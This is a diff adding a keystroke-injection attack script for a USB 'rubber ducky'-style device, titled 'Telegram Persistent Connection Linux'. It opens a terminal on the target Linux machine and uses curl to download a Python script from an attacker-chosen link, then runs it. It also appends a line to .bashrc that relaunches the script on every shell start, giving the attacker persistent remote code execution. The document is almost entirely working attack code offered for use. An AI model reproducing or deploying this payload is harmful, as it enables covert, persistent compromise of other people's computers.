@@ -1,0 +1,27 @@
+* REM #######################################################
+* REM #                                                     |
+* REM # Title        : Telegram Persistent Connection Linux |
+* REM # Author       : Aleff                                |
+* REM # Version      : 1.0                                  |
+* REM # Category     : Execution                            |
+* REM # Target       : Linux                                |
+* REM #                                                     |
+* REM #######################################################
+
+* REM Requirements:
+* REM     - Internet Connection
+
+QUACK DELAY 1000
+QUACK CTRL-ALT t
+QUACK DELAY 2000
+
+* REM Here you must put your own file link. Replace #PYTHON-SCRIPT-LINK with somethign like this https://www.example.com/connection.py
+QUACK STRING curl -o connection.py #PYTHON-SCRIPT-LINK; python3 connection.py; echo "if ! pgrep -f connection.py >/dev/null; then
+QUACK ENTER
+
+QUACK STRING python3 connection.py &
+QUACK ENTER
+
+QUACK STRING fi" >> .bashrc; exit
+QUACK ENTER
+
